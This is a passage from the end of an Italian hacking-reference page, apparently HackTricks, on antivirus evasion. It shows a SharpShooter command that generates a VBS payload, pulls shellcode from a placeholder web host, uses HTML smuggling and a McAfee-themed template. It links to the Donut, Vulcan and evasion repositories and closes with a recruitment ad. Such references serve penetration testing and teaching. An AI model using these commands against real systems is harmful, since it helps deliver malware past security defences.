SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Di più

- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<figure><img src="../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se sei interessato a una **carriera nel hacking** e a hackare l'inhackabile - **stiamo assumendo!** (_richiesta conoscenza fluente del polacco scritto e parlato_).

{% embed url="https://www.stmcyber.com/careers" %}

{{#include ../banners/hacktricks-training.md}}
